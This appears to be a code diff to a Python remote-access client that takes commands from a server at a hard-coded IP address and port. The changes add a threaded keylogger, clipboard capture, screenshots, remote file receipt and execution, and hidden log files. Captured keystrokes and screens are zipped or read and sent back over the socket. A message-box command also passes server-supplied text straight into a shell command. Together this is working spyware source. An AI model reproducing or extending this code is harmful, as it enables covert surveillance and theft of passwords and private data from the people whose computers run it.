@@ -13,6 +13,8 @@
 import datetime                                 # Scheduler
 import os                                       # running commands
 import platform                                 # System information
+import threading
+
 import schedule                                 # Scheduler
 import smtplib                                  # Emailer
 import socket                                   # Socket Connection
@@ -22,12 +24,14 @@ import time                                     # Sleep
 from pprint import pprint                       # Pretty Printing & Output
 from zipfile import ZipFile                     # Zipping Archives for file transfer
 
-from pynput.keyboard import Controller, Key     # Keylogger
-
+from mss import mss
+from pynput.keyboard import Controller, Key,Listener     # Keylogger
+import pyperclip
 
 class Client:
 # ''' SET UP CONNECTION '''
     def __init__(self, server_ip, port, buffer_size, client_ip):
+        self.sscount = 0
         self.SERVER_IP = server_ip
         self.PORT = port
         self.BUFFER_SIZE = buffer_size
@@ -35,22 +39,28 @@ class Client:
         self.recvcounter = 0
         self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.FinalSwitcher = {
-            "-Host": self.sendHostInfo,
-                "-Msg": self.txtmsg,
-                "-Fsend": self.filesend,
-                "-RP": self.runprocess,
-                "-RR": self.runrun,
-                "-Telnet": self.enableTN,
-                "-Chess": self.playchess,
-                "-EpIV": self.playstarwars,
-                "-Weather": self.weather,
-                "-lock": self.locksystem,
-                "-shutdown": self.shutdown,
-                "-shutdownM": self.shutdownmessage,
-                "-restart": self.restart,
-                "-shell": self.fakeshell,
-                "-loop": self.endless
+            "-msgbox": self.MSGBOX,
+            "-shutdown": self.shutdown,
+            "-shutdownM": self.shutdownmessage,
+            "-lock": self.locksystem,
+            "-restart": self.restart,
+            "-EpIV": self.playstarwars,
+            "-chess": self.playchess,
+            "-weather": self.weather,
+            "-telnet": self.enableTN,
+            "-KLstart": self.enableKeyLogger,
+            "-KLend": self.disableKeyLogger,
+            "-getLogs": self.keylogs,
+            "-getcb": self.clipboardgrab,
+            "-Fsend": self.filesend,
+            "-Frec": self.filerecv,
+            "-ginfo": self.sendHostInfo,
+            "-exe": self.exePy,
+            "-ss": self.screenshot,
+            "-shell": self.fakeshell,
+            "-loop": self.endless
         }
+        self.Keylogger = type(Keylogger)
     def connectToServer(self):
         self.client.connect((self.SERVER_IP, self.PORT))
 
@@ -203,17 +213,44 @@ class Client:
 
 # ''' KEYLOGGER FUNCTIONS '''
     def enableKeyLogger(self):
-        pass
-    def disableKeylogger(self):
-        def stopKeyLogger(self):
-            """ press esc key to stop the key logger """
+        # """ start thread for key logger """
+        self.Keylogger = Keylogger()
+        kThread = threading.Thread(target=self.Keylogger.log)
+        kThread.start()
 
-            keyboard = Controller()
-            keyboard.press(Key.esc)
-            keyboard.release(Key.esc)
-            self.keyLogger = False
+    def disableKeyLogger(self):
+        keyboard = Controller()
+        keyboard.press(Key.esc)
+        keyboard.release(Key.esc)
+        print("KEYLOGGER KILLED")
+
     def keylogs(self):
-        pass
+        try:
+            archname = './logs/files.zip'
+            archive = ZipFile(archname, 'w')
+
+            archive.write('./logs/readable.txt')
+            archive.write('./logs/keycodes.txt')
+
+            archive.close()
+            self.client.send("[OK]".encode("utf-8"))
+            time.sleep(0.1)
+
+            # send size
+            arcsize = os.path.getsize(archname)
+            self.client.send(str(arcsize).encode("utf-8"))
+
+            # send archive
+            with open('./logs/files.zip', 'rb') as to_send:
+                self.client.send(to_send.read())
+
+            os.remove(archname)
+
+        except:
+            self.client.send("[ERROR]".encode("utf-8"))
+
+    def clipboardgrab(self):
+        self.client.send(getClipBoard().encode())
 
 # ''' CMD Functions '''
     def runprocess(self, msg):
@@ -237,7 +274,7 @@ class Client:
             print("This failed too (runrun) : " + str(e) + " + " + str(obj))
 
     def MSGBOX(self):
-        insert = "this is a test"
+        insert = self.client.recv(self.BUFFER_SIZE).decode()
         try :
             msgA = '(echo MsgBox "' + insert + '" ^& vbCrLf ^& "Line 2",262192, "Title")> File.vbs'
             self.runrun(msgA)
@@ -340,6 +377,9 @@ class Client:
         except:
             self.client.send("FAILURE".encode())
 
+    def hidefile(self, filepath):
+        command = "attrib +h "+filepath+""
+        self.runrun(command)
 
 # ''' EMAILER FUNCTIONS '''
     def emailsendbody(self, body):
@@ -377,6 +417,99 @@ class Client:
         while True:
             schedule.run_pending()
             time.sleep(1)
+
+# '''SCREENSHOT'''
+    def screenshot(self):
+        ss = mss()
+        ss.shot(output='./logs/screen{}.png'.format(self.sscount))  # taking screenshot
+        picsize = os.path.getsize('./logs/screen{}.png'.format(self.sscount))
+        self.client.send(str(picsize).encode())
+        time.sleep(0.1)
+        with open('./logs/screen{}.png'.format(self.sscount), 'rb') as screen:
+            tosend = screen.read()
+            self.client.send(tosend)  # sending actual file
+        # os.remove('./logs/screen{}.png'.format(self.screenshot_counter))  # removing file from host
+        self.sscount += 1
+        print("SUCCESS")
+
+
+# ''' STATIC METHODS '''
+def getClipBoard():
+    cb = pyperclip.paste()  # getting the clipboard
+
+    if len(cb) == 0:
+        contents = "/No Clipboard contents/"
+    else:
+        contents = cb
+    print(contents)
+    return contents
+
+
+class Keylogger:
+    def __init__(self):
+        # Dictionary containing all the keys
+        # which may not produce a visible output in the log,
+        # but still need recording
+        self.modifier_keys = {
+            "Key.enter": '\n',
+            "Key.space": ' ',
+            "Key.shift_l": '',
+            "Key.shift_r": '',
+            "Key.tab": "[TAB]",
+            "Key.backspace": "[BACKSPACE]",
+            "Key.caps_lock": "[CAPSLOCK]",
+            "Key.ctrl": "[CTRL]",
+            r"'\x03'":  "\n[COPIED TO CLIPBOARD] \n",
+            r"'\x16'": "\n[Pasted: " + getClipBoard() + "]\n"
+        }
+        self.standardkey = True
+
+        # Make a folder to store the logs,
+        # if the folder already exists continue
+        try:
+            os.mkdir('./logs')
+        except FileExistsError:
+            pass
+
+    # When a key is pressed on keyboard
+    def key_press(self, key):
+        # ESCAPE CLAUSE
+        if key == Key.esc:
+            print("ESCAPED: ")
+            input()
+            return False
+
+        with open('./logs/readable.txt', 'a+') as log, open('./logs/keycodes.txt', 'a+') as codes:
+            # key codes
+            # This produces an output unreadable to humans
+            print("added code: " + str(key))
+            codes.write(str(key) + '\n')
+
+            # readable keys
+            for keycode in self.modifier_keys:
+                # print("key = " + str(key) + " code = " + keycode)
+                if keycode == str(key):
+                    self.standardkey = False
+                    log.write(self.modifier_keys[keycode])
+
+                    break
+            if self.standardkey:
+                log.write(str(key).replace("'", ""))
+            self.standardkey = True
+
+    def log(self):
+           with Listener(on_press=self.key_press) as listener:
+            listener.join()  # listening for keystrokes
+
+    def hidelogs(self):
+        """ Hiding key-logger logs """
+        command = "attrib +h ./logs/readable.txt"
+        subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
+        time.sleep(1)
+        command = "attrib +h ./logs/keycodes.txt"
+        subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
+
+
 def main():
     SERVER_IP = "192.168.56.1"  # modify me
     PORT = 1337  # modify me (if you want)
